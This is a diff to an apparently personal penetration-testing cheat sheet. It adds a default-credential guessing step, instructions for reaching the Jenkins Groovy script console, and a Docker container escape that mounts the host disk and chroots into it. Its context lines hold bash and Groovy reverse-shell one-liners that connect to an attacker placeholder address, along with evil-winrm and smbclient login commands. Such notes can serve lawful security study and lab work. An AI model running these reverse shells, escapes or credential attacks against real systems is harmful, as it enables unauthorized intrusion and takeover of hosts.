@@ -362,7 +362,7 @@ evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
 evil-winrm -i 192.168.1.222 -u john -p my-pass
 ```
 
-### smbclient
+ - **smbclient**
 ```
 # SMB loging if you know a user name and password
 smbclient -U <username> //<ip>/<share>
@@ -419,6 +419,12 @@ Steps:
 6. If everything works, the target machine will connect back to you,
    and you will get a remote shell (control of the system).
 ```
+ - **Default Credential Attack**
+```
+If a login page is identified, attempt authentication using known default credentials for the service or application. 
+
+Additionally, test common weak username and password combinations (e.g., admin/admin, admin/password).
+```
 ## Linux Access
 
  - **SSH**
@@ -469,6 +475,12 @@ bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1
 
 # Groovy reverse shell
 ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"].execute()
+```
+ - **Default Credential Attack**
+```
+If a login page is identified, attempt authentication using known default credentials for the service or application. 
+
+Additionally, test common weak username and password combinations (e.g., admin/admin, admin/password).
 ```
 
 # Section 6. Actions on Objective
@@ -668,4 +680,32 @@ docker compose -f /path/to/docker-compose.yml down
 ### Peass
 ```
 /usr/share/peass
+```
+### Jenkins Groovy Script
+```
+To access the Jenkins Script Console (Groovy):
+
+1. Log in to Jenkins
+2. Navigate to the following path in your browser:
+   http://<jenkins_url>:<port_number>/script
+
+This will open the Script Console, where you can execute Groovy scripts directly on the Jenkins server.
+```
+### Dokcer Escape
+```
+# List available disks
+fdisk -l
+
+# Create a mount point
+mkdir /mnt/host
+
+# Mount the host root filesystem
+# (replace /dev/sda1 with the correct disk/partition name)
+mount /dev/sda1 /mnt/host
+
+# Chroot into the mounted filesystem
+chroot /mnt/host /bin/bash
+
+# Verify you are root on the host filesystem
+id
 ```
